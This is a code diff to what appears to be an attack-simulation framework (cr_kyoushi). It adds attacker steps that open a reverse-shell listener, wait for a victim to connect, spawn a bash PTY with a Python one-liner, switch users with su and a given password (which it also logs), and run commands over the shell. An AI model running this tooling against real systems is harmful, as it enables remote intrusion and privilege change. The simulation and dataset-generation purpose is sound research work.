@@ -8,10 +8,13 @@ import select
 import subprocess
 import sys
 
+from datetime import datetime
 from pathlib import Path
+from socket import socket
 from typing import (
     List,
     Optional,
+    Pattern,
     TextIO,
     Tuple,
     Union,
@@ -20,11 +23,21 @@ from typing import (
 import requests
 
 from bs4 import BeautifulSoup
+from pwnlib.tubes.listen import listen
 from structlog.stdlib import BoundLogger
 
-from cr_kyoushi.simulation.util import sleep
+from cr_kyoushi.simulation.util import (
+    sleep,
+    sleep_until,
+)
 
 from .context import Context
+from .expect import (
+    BASH_PATTERN,
+    SH_PATTERN,
+    SU_FAIL,
+    SU_PASSWORD_PROMPT,
+)
 
 
 def read_output(
@@ -561,3 +574,329 @@ class ExecWebShellCommand:
         log = log.bind(cmd=self.cmd, cmd_param=self.cmd_param, web_shell=web_shell)
         output = send_request(log, web_shell, self.cmd, self.cmd_param, self.verify)
         log.info("Web shell command response", output=output)
+
+
+class WaitUntilNext:
+    """Transition function for waiting until a specific datetime"""
+
+    def __init__(self, start: datetime, name: str = "next phase"):
+        """
+        Args:
+            start: The datetime to wait until
+            name: The name to use for logging
+        """
+        self.start: datetime = start
+        self.name: str = name
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        log = log.bind(name=self.name, start_time=self.start)
+        log.info("Waiting until")
+        sleep_until(self.start)
+        log.info("Waited until")
+
+
+def _receive(
+    log: BoundLogger,
+    shell: listen,
+    regex: Pattern = BASH_PATTERN,
+    timeout: int = 60 * 5,
+    encoding: str = "utf-8",
+) -> List[str]:
+    """Utility function for waiting for an expected output.
+
+    Continuously receives from the given shell until the collected
+    output contains the given regex.
+
+    Args:
+        log: The logger instance
+        shell: The shell to receive on
+        regex): The regex to wait for
+        timeout: The maximum to time to wait for any output
+        encoding: The encoding to use for decoding
+
+    Raises:
+        TimeoutError: If nothing is received within the given timeout
+
+    Returns:
+        The list of output lines
+
+    !!! Warning
+        A timeout is only triggered if nothing is received at all.
+        Meaning that even if we never receive the output matching the
+        regex the function will not timeout as long as anything is received.
+    """
+    # configure recv timeout
+    old_timeout = shell.timeout
+    shell.timeout = timeout
+
+    output = ""
+    while not regex.search(output):
+        output_part = shell.recv().decode(encoding)
+        output += output_part
+        if len(output_part) > 0:
+            log.debug("Received shell output part", output_part=output_part.split("\n"))
+        else:
+            log.error(
+                "Shell receive timeout",
+                expected=regex,
+                received_output=output.split("\n"),
+            )
+            raise TimeoutError("Timeout receiving expected shell output")
+
+    outlines = output.split("\n")
+    log.info("Received shell output", outlines=outlines)
+
+    # reset recv timeout
+    shell.timeout = old_timeout
+
+    return outlines
+
+
+class StartReverseShellListener:
+    """Transition function that starts a reverse shell listener"""
+
+    def __init__(self, port: int, bindaddr: str = "::", fam: str = "any"):
+        """
+        Args:
+            port: The port to listen on
+            bindaddr: The address to bind to
+            fam: The IP family to listen for "any", "ipv4" or "ipv6"
+        """
+        self.port: int = port
+        self.bindaddr: str = bindaddr
+        self.fam: str = fam
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        log = log.bind(
+            listen_port=self.port, bind_address=self.bindaddr, ip_family=self.fam
+        )
+
+        log.info("Start listening for reverse shell")
+        context.reverse_shell = listen(self.port, self.bindaddr, self.fam)
+        log.info("Started listening for reverse shell")
+
+
+class WaitReverseShellConnection:
+    """Transition function that waits for a reverse shell connection"""
+
+    def __init__(
+        self,
+        expect_after: Pattern = SH_PATTERN,
+        encoding: str = "utf-8",
+        timeout: int = 60 * 2,
+    ):
+        """
+        Args:
+            expect_after: The regex to wait for after connecting
+            encoding: The encoding to use for sending and receiving
+            timeout: Maximum time to wait for outputs
+        """
+        self.expect_after: Pattern = expect_after
+        self.encoding: str = encoding
+        self.timeout: int = timeout
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        reverse_shell = context.reverse_shell
+        if reverse_shell is not None:
+
+            log.info("Waiting for reverse shell connection")
+            reverse_shell.wait_for_connection()
+            sock: socket = reverse_shell.sock
+            log = log.bind(
+                listen_socket=sock.getsockname(), remote_socket=sock.getpeername()
+            )
+            log.info("Waiting for prompt")
+            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
+            log.info("Reverse shell connected")
+
+        else:
+            log.error("Failed to open PTY shell")
+            raise Exception("Shell is not connected")
+
+
+def close_reverse_shell(
+    log: BoundLogger,
+    current_state: str,
+    context: Context,
+    target: Optional[str],
+):
+    """Transition function to close a reverse shell"""
+
+    reverse_shell = context.reverse_shell
+    if reverse_shell is not None:
+        # add sock info to log context
+        log = log.bind(
+            listen_socket=reverse_shell.sock.getsockname(),
+            remote_socket=reverse_shell.sock.getpeername(),
+        )
+        log.info("Closing reverse shell")
+        reverse_shell.close()
+        log.info("Closed reverse shell")
+    else:
+        log.warn("No reverse shell")
+
+
+class OpenPTY:
+    """Transition function that opens a PTY for in the reverse shell"""
+
+    def __init__(
+        self,
+        spawn_command: str = "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        expect_after: Pattern = BASH_PATTERN,
+        encoding: str = "utf-8",
+        timeout: int = 60 * 2,
+    ):
+        """
+        Args:
+            spawn_command: The command to use for spawning the PTY
+            expect_after: The regex to wait for after spawning the PTY
+            encoding: The encoding to use for sending and receiving
+            timeout: Maximum time to wait for outputs
+        """
+        self.spawn_command: str = spawn_command
+        self.expect_after: Pattern = expect_after
+        self.encoding: str = encoding
+        self.timeout: int = timeout
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        reverse_shell = context.reverse_shell
+        if reverse_shell is not None and reverse_shell.connected():
+            # add pty spawn command to log context
+            log.bind(spawn_command=self.spawn_command)
+
+            log.info("Opening pty shell")
+            reverse_shell.sendline(self.spawn_command.encode(self.encoding))
+            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
+            log.info("Opened pty shell")
+
+        else:
+            log.error("Failed to open PTY shell")
+            raise Exception("Shell is not connected")
+
+
+class ShellChangeUser:
+    """Transition function to login to another user"""
+
+    def __init__(
+        self,
+        username: str,
+        password: str,
+        expect_prompt: Pattern = SU_PASSWORD_PROMPT,
+        expect_after: Pattern = BASH_PATTERN,
+        encoding: str = "utf-8",
+        timeout: int = 60 * 2,
+    ):
+        """
+        Args:
+            username: The user to change to
+            password: The password of the user
+            expect_prompt: Output regex to expect for the password prompt
+            expect_after: Regex to wait for after changing user
+            encoding: The encoding to use for sending and receiving
+            timeout: Maximum time to wait for outputs
+        """
+        self.username: str = username
+        self.password: str = password
+        self.expect_prompt: Pattern = expect_prompt
+        self.expect_after: Pattern = expect_after
+        self.encoding: str = encoding
+        self.timeout: int = timeout
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        reverse_shell = context.reverse_shell
+        if reverse_shell is not None and reverse_shell.connected():
+            # add pty spawn command to log context
+            log.bind(username=self.username, password=self.password)
+
+            log.info("Changing user")
+            reverse_shell.sendline(f"su {self.username}".encode(self.encoding))
+            _receive(
+                log, reverse_shell, self.expect_prompt, self.timeout, self.encoding
+            )
+            log.info("Sending password")
+            reverse_shell.sendline(self.password.encode(self.encoding))
+            output = _receive(
+                log, reverse_shell, self.expect_after, self.timeout, self.encoding
+            )
+            if SU_FAIL.search("\n".join(output)):
+                log.error("Authentication failure")
+                raise Exception("Failed to change user")
+            else:
+                log.info("Changed user")
+        else:
+            log.error("Failed to change user")
+            raise Exception("Shell is not connected")
+
+
+class ExecShellCommand:
+    """Transition function that executes a shell command using a reverse shell"""
+
+    def __init__(
+        self,
+        cmd: str,
+        expect_after: Pattern = BASH_PATTERN,
+        encoding: str = "utf-8",
+        timeout: int = 60 * 2,
+    ):
+        """
+        Args:
+            cmd: The cmd to execute
+            expect_after: The output patter to wait for
+            encoding: The encoding to use for sending and receiving
+            timeout: Maximum time to wait for outputs
+        """
+        self.cmd: str = cmd
+        self.expect_after: Pattern = expect_after
+        self.encoding: str = encoding
+        self.timeout: int = timeout
+
+    def __call__(
+        self,
+        log: BoundLogger,
+        current_state: str,
+        context: Context,
+        target: Optional[str],
+    ):
+        reverse_shell = context.reverse_shell
+
+        # add cmd to log context
+        log = log.bind(cmd=self.cmd)
+
+        if reverse_shell is not None and reverse_shell.connected():
+            log.info("Executing command")
+            reverse_shell.sendline(self.cmd.encode(self.encoding))
+            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
+            log.info("Executed command")
+        else:
+            log.error("Failed to exec command")
+            raise Exception("Shell is not connected")
